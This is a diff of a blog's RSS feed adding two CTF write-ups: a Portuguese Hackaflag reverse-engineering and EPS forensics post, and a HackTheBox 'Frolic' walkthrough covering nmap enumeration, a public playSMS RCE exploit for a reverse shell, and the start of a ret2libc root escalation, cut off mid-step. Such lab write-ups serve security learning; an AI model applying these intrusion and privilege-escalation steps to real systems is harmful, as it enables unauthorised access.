@@ -6,8 +6,8 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 02 Apr 2020 23:15:28 -0300</pubDate>
-    <lastBuildDate>Thu, 02 Apr 2020 23:15:28 -0300</lastBuildDate>
+    <pubDate>Fri, 03 Apr 2020 13:48:54 -0300</pubDate>
+    <lastBuildDate>Fri, 03 Apr 2020 13:48:54 -0300</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
     
       <item>
@@ -707,6 +707,458 @@ loc_9cc:
         <category>|</category>
         
         <category>RATF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
+        <title>HACKAFLAG CAMPINAS Reverse &amp; Misc Write-up</title>
+        <description>&lt;p&gt;Fala galera! até o dia 17/04 rolou a 1ª etapa do Hackaflag 2019.Consegui a 4ª colocação nesse etapa e os desafios foram bem legais.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Resolvi trazer esses dois porque foram os que achei mais divertidos de resolver.&lt;/p&gt;
+
+&lt;p&gt;PS: Esses foram os métodos que usei para resolver, talvez não os melhores, mas com certeza cheguei nas flags xd&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;1 Desafio -&amp;gt; MISC&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;Descrição: Por mais pequeno que seja, esse desafio vem com a missão de fazer você conhecer um formato de arquivo EPS e entender como ele é composto.&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;Além dessa breve descrição nos é dado um arquivo para download. Vamos analisá-lo.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc]$ file flag                                            
+flag: DOS EPS Binary File Postscript starts at byte 30 length 68473 
+TIFF starts at byte 68503 length 2317330&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Bem como disse a descrição, temos um arquivo EPS, mas ainda não conseguimos abri-lo porque no próprio retorno do comando file ele nos diz que o EPS começa no byte 30.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Precisamos remover esses 30 primeiros bytes. Vamos usar o comando ‘dd’ para isso.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;dd if=flag of=flag.eps ibs=30 skip=1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Agora quando rodamos o comando ‘file’ novamente já nos é retornado outra coisa&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc/writeup]$ file flag.eps                                               
+flag.eps: PostScript document text conforming DSC level 3.0, type 
+EPS, Level 2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Vamos tentar abrí-lo com o programa &lt;b&gt;Inkscape&lt;/b&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Erro, pois ainda no arquivo há um tiff como vimos la no primeiro ‘file’ que demos.&lt;/p&gt;
+
+&lt;p&gt;Para retirá-lo, vamos usar o comando ‘truncate’&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc/writeup]$ truncate -s 68395 flag.eps&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Agora ao abrí-lo com o Inkscape, temos&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Essa imagem.&lt;/p&gt;
+
+&lt;p&gt;Essa parte é sem dúvida a pior do desafio, achar onde diabos está a flag aqui.Passei horas, cheguei a pensar que a flag não estivesse na imagem de tanto procurar, mas ela está ai. Uma parte da definição de uma EPS file diz isso:&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;It is more like a postscript program that instructs images and drawings to be placed on a document&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;Então pesquisei em formas de manipular essas imagens presentes e uma delas me ajudou, o XML Editor.&lt;/p&gt;
+
+&lt;p&gt;Até que&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ta aí a coisa.&lt;/p&gt;
+
+&lt;p&gt;Pegando todos os chars temos:&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{ESCOND_DO_NO_L_MBO}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;O que não é a flag final, mas é fácil ver que a flag fica…&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{ESCONDIDO_NO_LIMBO}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;2 desafio -&amp;gt; REVERSE&lt;/p&gt;
+
+&lt;p&gt;Desafio mais complicado dessa primeira etapa, foi o que teve menos solves. Por assumir coisas erradas demorei muito mais tempo do que precisava para resolver esse desafio, mas no fim deu tudo certo.&lt;/p&gt;
+
+&lt;p&gt;Descrição: Consegue me ajudar?&lt;/p&gt;
+
+&lt;p&gt;Além da descrição nos é dado um binário, campinas.exe. Um binário windows, vamos executá-lo.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De cara já temos nossa flag em b64 somente &lt;em&gt;-&lt;/em&gt; , sqn xd&lt;/p&gt;
+
+&lt;p&gt;Joguei o binário no Ghidra para ver do que se tratava.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analisando as funções vemos uma bem interessante, Criptografar.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mas está muito complicado de analisá-la assim, fui atrás de ver as strings para ver se encontrava alguma luz.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code10.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analisando notei essa que dizia “.NET framework 4.6.1” e eu sei que consigo usar decompiler nesses sistemas, no caso usei o dotPeek da JetBrains e consegui o código descompilado da função Criptografar.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code11.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analisando passo a passo do código&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Primeiro é feito uma requisição para essa string em hexa mas em uma formatação estranha, depois é passado outros parâmetros como método, ContentType, etc, quem não nos interessa.&lt;/li&gt;
+	&lt;li&gt;Depois ele pega o conteúdo recebido do servidor e joga no MD5cryptoServiceProvider, ou seja, gera um md5 do retorno.&lt;/li&gt;
+	&lt;li&gt;Após isso, é criado um TripleDESCryptoServiceProvider que tem como um dos parâmetros a chave, que é a hash md5 que foi gerado a pouco.&lt;/li&gt;
+	&lt;li&gt;Ao final retorna a flag em base64 como vimos ao rodar o programa.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nossa primeira e mais difícil tarefa será descobrir o endereço dessa requisição para conseguir nossa chave.&lt;/p&gt;
+
+&lt;p&gt;Vemos que a string encodada passada está em servindo de parâmetro para outra função, vamos analisá-la, a class8_metho0, no meu caso.&lt;/p&gt;
+
+&lt;p&gt;No caso a class8_method0 só faz uma checagem de data e retorna a string para a class9_method0&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code12.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fiz uma pequena alteração no código e rodei a função passando a string e o inteiro que vi na função &lt;b&gt;Criptografa&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;E me é retornado isso:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;xdd`c*??xqs{qv|qw&amp;gt;s}&amp;gt;rb?sdv?tucqvyc?!qt(vt”tvrr qts !%t’r#%q$”rr)r()?s}}q~ts~db|&amp;gt;`x`&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;wtf is isso?&lt;/p&gt;
+
+&lt;p&gt;Notei que eu estava esperando uma url e resolvi comparar, notemos que podemos fazer &lt;code&gt;ascii(x) — 16 -&amp;gt; h ascii(d) +16 -&amp;gt; t ascii(`)-&amp;gt; p ascii(c) + 16-&amp;gt; s&lt;/code&gt; daí ja conseguimos o ‘https’&lt;/p&gt;
+
+&lt;p&gt;Eu realmente espero do fundo do coração que haja um método melhor de resolver do que esse T.T
+Ao terminarmos de decodar:&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://hackaflag.com.br/ctf/desafios/1ad8fd2dfbb0adc015d7b35a42bb9b89/commandcontrol.php&quot; class=&quot;text-white&quot;&gt;https://hackaflag.com.br/ctf/desafios/1ad8fd2dfbb0adc015d7b35a42bb9b89/commandcontrol.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Acessando esse link encontramos nossa chave.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;THMPV-77D6F-94376–8HGKG-VRDRQ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois disso devemos lembrar que a chave foi encodada em b64 para fazer criptografar nossa flag.&lt;/p&gt;
+
+&lt;p&gt;Então,&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Criptografia TripleDES&lt;/li&gt;
+	&lt;li&gt;Modo ECB&lt;/li&gt;
+	&lt;li&gt;chave = d5637a2c7e17f17947df72f5b3d3d20c&lt;/li&gt;
+	&lt;li&gt;flag = YMP1zrjTmr1P0wVJh7ocL55O5ZY3EYec&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Já temos tudo!&lt;/p&gt;
+
+&lt;p&gt;Usei essa ótima ferramenta online para conseguir a flag.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code13.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;http://tripledes.online-domain-tools.com/&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS 3DES Encryption&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code14.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tive que passar a flag para hex, pois a tool não suportava b64.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{TripleDESneT}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Assim foi como resolvi essas duas flags dessa etapa, espero que alguém tenha aprendido algo, se não escrevi isso tudo pra nada xd&lt;/p&gt;
+
+&lt;p&gt;Obrigado!&lt;/p&gt;
+
+&lt;p&gt;By me&lt;/p&gt;
+</description>
+        <pubDate>Thu, 18 Apr 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/hackflag-campinas-reverse-&-misc-write-up/</link>
+        <guid isPermaLink="true">http://localhost:4000/hackflag-campinas-reverse-&-misc-write-up/</guid>
+        
+        <category>CTF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
+        <title>Frolic — HacktheBox Walkthrough</title>
+        <description>&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/desc.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hey guys! In this post I will be showing how I solved the machine “Frolic” from HackTheBox.&lt;/p&gt;
+
+&lt;p&gt;It was a pretty ctf like machine, and well… I love ctfs, so that turned out to be really fun, specially priv esc part.&lt;/p&gt;
+
+&lt;p&gt;I’ll be posting the links where I got some references on how to proceed when I got a bit stucked.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s start with our standard nmap scan:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;nmap -sV -sC -v 10.10.10.111
+# Nmap 7.60 scan initiated Sat Mar 16 08:43:07 2019 as: nmap -sV -sC -v -o frolic 10.10.10.111
+Nmap scan report for 10.10.10.111
+Host is up (0.23s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
+|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
+|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (EdDSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+| nbstat: NetBIOS name: FROLIC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| Names:
+|   FROLIC&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   FROLIC&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   FROLIC&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC\x00
+|   Domain name: \x00
+|   FQDN: frolic
+|_  System time: 2019-03-16T17:13:43+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-03-16 08:43:43
+|_  start_date: 1600-12-31 21:26:00
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Mar 16 08:43:49 2019 -- 1 IP address (1 host up) scanned in 42.33 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can spot four different services running on this box, three of them are useless for us, so let’s focus on the service running on port 9999, a web service.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example1.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We are presented with the default nginx page, brute forcing some directories we find the /admin page.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A log in page, we must find some credentials. Looking in the source code of the js file, we find this.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code1.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, we got our user and pass. Let’s check the success.html page.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;user = admin
+password = superduperlooperpassword_lol&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What the heck is this?? 😐&lt;/p&gt;
+
+&lt;p&gt;After some searching on esoteric languages I found this “Ook!?” Programming language and a website that could decode it.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It tells us to check another directory so off we go.&lt;/p&gt;
+
+&lt;p&gt;Reaching this dir we find this&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It appears to be a base64 encoded message, so when I decoded it show a PK… among other random bytes.So this is a zip file.&lt;/p&gt;
+
+&lt;p&gt;When I tried the unzip It asks for a password. I just brute forced it and the password found as was “password”, how cool xd.&lt;/p&gt;
+
+&lt;p&gt;Moving on, the file inside called “index.php” shows:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;obviously some hex code&lt;/p&gt;
+
+&lt;p&gt;decoding it we get another b64 and after that we find this&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;+++++ +++++ [-&amp;gt;++ +++++ +++&amp;lt;] &amp;gt;++++ +.--- --.++ +++++ .&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+++.&amp;lt;+ ++[-&amp;gt; ---&amp;lt;] &amp;gt;---- --.-- ----- .&amp;lt;+++ +[-&amp;gt;+ +++&amp;lt;] &amp;gt;+++. &amp;lt;+++[ -&amp;gt;---&amp;lt;]&amp;gt;-- .&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+ .---. &amp;lt;+++[ -&amp;gt;--- &amp;lt;]&amp;gt;-- ----. &amp;lt;++++ [-&amp;gt;++ ++&amp;lt;]&amp;gt;++..&amp;lt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That’s clearly a brain f*ck code. Let’s see what is says&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, we got something that looks like a password, but password for what? 😿&lt;/p&gt;
+
+&lt;p&gt;Let’s go back to our enumeration phase and start over, we must have missed something.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;The backup gives us some creds, but it is a rabbit hole :(
+the test page gives us php info. nothing useful.
+dev page a 403 error.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Awesome, after some more enumeration we got nothing xd&lt;/p&gt;
+
+&lt;p&gt;Let’s keep trying&lt;/p&gt;
+
+&lt;p&gt;Looking into dev/ folder we have another backup.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And there we have a /playsms folder, finally something to use ours creds on.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To get our reverse shell I found this great exploit on github.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://github.com/jasperla/CVE-2017-9101&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS GITHUB- jasperla&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sweet! We got rce.&lt;/p&gt;
+
+&lt;p&gt;Since this is a pretty bad shell I got a new one using php and netcat. But I’ll just skip this part xd&lt;/p&gt;
+
+&lt;p&gt;After getting a better shell, just went to the user home dir and found user.txt xd.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now the root part!&lt;/p&gt;
+
+&lt;p&gt;Searching the home directory of ayush, we find a .binary dir.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We find a “rop” binary. Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let’s try.&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;In this post I’ll not be explaining how a buffer overflow occurs or how to exploit it in details. I’m just gonna explain some thoughts that I had during the exploitation.&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;The binary simply runs with an argument the we pass and spits it back out for us, nothing interesting, however if we send a lot of bytes to it, it breaks.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, we can overwrite EIP but return where?&lt;/p&gt;
+
+&lt;p&gt;The name of the binary already gives us a pretty good hint on what to do, let’s use a technique called “Return to libc” that is a type of ROP.&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;You can learn more what is ROP here&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;If you wanna know more about Ret2libc those following links helped me a lot.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m17mV24TgwY&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/example9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://galvanizedsecurity.com/ret2libc/&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS RET2LIBC&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;So basically we need 5 things to succeed.&lt;/p&gt;
+&lt;ol&gt;
+	&lt;li&gt;The offset to overwrite EIP&lt;/li&gt;
+	&lt;li&gt;libc base address&lt;/li&gt;
+	&lt;li&gt;system call offset&lt;/li&gt;
+	&lt;li&gt;exit call offset (optional)&lt;/li&gt;
+	&lt;li&gt;string “/bin/bash”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Lets do one by one:&lt;/p&gt;
+
+&lt;p&gt;To get the offset to overwrite eip I used that pretty standard technique with pattern_create, and got a number of 52.&lt;/p&gt;
+
+&lt;p&gt;To get libc base address we use ldd and grep for libc.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/6/code7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;Note: ASLR is turned off in this box, so lucky for us we don’t need to bypass it.&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we need system call offset for libc we do&lt;/p&gt;
+
